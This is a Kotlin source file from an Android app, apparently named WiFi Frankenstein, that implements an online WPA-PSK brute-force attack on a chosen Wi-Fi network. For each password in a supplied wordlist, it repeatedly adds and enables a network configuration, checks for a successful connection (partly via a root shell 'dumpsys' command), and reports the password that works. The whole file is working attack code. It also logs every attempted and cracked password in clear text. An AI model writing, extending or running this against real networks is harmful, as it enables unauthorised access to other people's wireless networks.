package com.lsd.wififrankenstein.util

import android.content.Context
import android.net.ConnectivityManager
import android.net.wifi.WifiConfiguration
import android.net.wifi.WifiManager
import com.lsd.wififrankenstein.R
import com.topjohnwu.superuser.Shell
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.withContext
import java.io.BufferedReader
import java.io.InputStreamReader

data class PskBruteForceProgress(
    val currentPassword: String,
    val attemptNumber: Int,
    val totalPasswords: Int,
    val statusMessage: String
)

data class PskBruteForceResult(
    val foundPassword: String?,
    val success: Boolean,
    val attemptsMade: Int
)

class PskBruteForceRunner(private val context: Context) {

    companion object {
        private const val TAG = "PskBruteForceRunner"
        private const val CONNECTION_WAIT_MS = 6000L
        private const val CONNECTION_POLL_INTERVAL_MS = 500L
        private const val CONNECTION_MAX_POLLS = 20
    }

    private val wifiManager =
        context.applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
    private val connectivityManager =
        context.applicationContext.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager

    suspend fun runAttack(
        ssid: String,
        bssid: String,
        wordlistUri: android.net.Uri,
        onProgress: ((PskBruteForceProgress) -> Unit)? = null
    ): PskBruteForceResult = withContext(Dispatchers.IO) {
        Log.d(TAG, "=== PSK BRUTE FORCE START ===")
        Log.d(TAG, "ssid=$ssid, bssid=$bssid, uri=$wordlistUri")

        var attempts = 0
        var totalLines = 0

        try {
            val inputStream = context.contentResolver.openInputStream(wordlistUri)
                ?: return@withContext PskBruteForceResult(null, false, 0)

            val reader = BufferedReader(InputStreamReader(inputStream))

            reader.use { br ->
                var line: String?
                while (br.readLine().also { line = it } != null) {
                    totalLines++
                }
            }
            Log.d(TAG, "Wordlist total lines: $totalLines")

            val inputStream2 = context.contentResolver.openInputStream(wordlistUri)
                ?: return@withContext PskBruteForceResult(null, false, 0)

            val reader2 = BufferedReader(InputStreamReader(inputStream2))

            reader2.use { br ->
                var line: String?
                while (br.readLine().also { line = it } != null) {
                    val password = line!!.trim()
                    if (password.isEmpty() || password.startsWith("#")) {
                        attempts++
                        continue
                    }

                    attempts++
                    Log.d(TAG, "Attempt $attempts/$totalLines: trying '$password'")

                    onProgress?.invoke(
                        PskBruteForceProgress(
                            currentPassword = password,
                            attemptNumber = attempts,
                            totalPasswords = totalLines,
                            statusMessage = context.getString(R.string.brute_trying, password)
                        )
                    )

                    val netId = addWifiNetwork(ssid, bssid, password)
                    if (netId == -1) {
                        Log.w(TAG, "Failed to add network config for password attempt $attempts")
                        continue
                    }

                    delay(CONNECTION_WAIT_MS)

                    if (isConnectedToSsid(ssid, bssid)) {
                        Log.d(TAG, "SUCCESS! Password found: $password")
                        onProgress?.invoke(
                            PskBruteForceProgress(
                                currentPassword = password,
                                attemptNumber = attempts,
                                totalPasswords = totalLines,
                                statusMessage = context.getString(R.string.brute_found, password)
                            )
                        )
                        return@withContext PskBruteForceResult(password, true, attempts)
                    }

                    removeWifiNetwork(netId)

                    if (attempts % 10 == 0) {
                        Log.d(TAG, "Progress: $attempts/$totalLines attempts")
                    }
                }
            }

            Log.d(TAG, "=== PSK BRUTE FORCE END (not found after $attempts attempts) ===")
            PskBruteForceResult(null, false, attempts)

        } catch (e: Exception) {
            Log.e(TAG, "PSK brute force failed", e)
            PskBruteForceResult(null, false, attempts)
        }
    }

    private fun addWifiNetwork(ssid: String, bssid: String, password: String): Int {
        return try {
            val wifiConfig = WifiConfiguration().apply {
                this.SSID = "\"$ssid\""
                this.BSSID = bssid
                allowedKeyManagement.set(WifiConfiguration.KeyMgmt.WPA_PSK)
                preSharedKey = "\"$password\""
            }

            val netId = wifiManager.addNetwork(wifiConfig)
            if (netId == -1) return -1

            wifiManager.disconnect()
            wifiManager.enableNetwork(netId, true)
            wifiManager.reconnect()
            netId
        } catch (e: Exception) {
            Log.e(TAG, "addWifiNetwork failed", e)
            -1
        }
    }

    private fun removeWifiNetwork(netId: Int) {
        try {
            wifiManager.removeNetwork(netId)
        } catch (e: Exception) {
            Log.w(TAG, "removeWifiNetwork failed for netId=$netId", e)
        }
    }

    private fun isConnectedToSsid(ssid: String, bssid: String): Boolean {
        if (checkViaWifiManager(ssid, bssid)) return true
        if (checkViaDumpsys(ssid)) return true
        return false
    }

    private fun checkViaWifiManager(ssid: String, bssid: String): Boolean {
        return try {
            val wifiInfo = wifiManager.connectionInfo
            val currentSsid = wifiInfo.ssid?.replace("\"", "")
            val currentBssid = wifiInfo.bssid

            currentSsid == ssid &&
                    (currentBssid.equals(bssid, ignoreCase = true) || currentBssid == null)
        } catch (e: Exception) {
            false
        }
    }

    private fun checkViaDumpsys(targetSsid: String): Boolean {
        return try {
            val result = Shell.cmd("dumpsys netstats | grep wlan").exec()
            result.out.any { line ->
                line.contains(targetSsid, ignoreCase = true)
            }
        } catch (e: Exception) {
            Log.w(TAG, "dumpsys check failed", e)
            false
        }
    }

    fun cancel() {
        Log.d(TAG, "PSK brute force cancellation requested (no-op, will stop on next iteration)")
    }
}
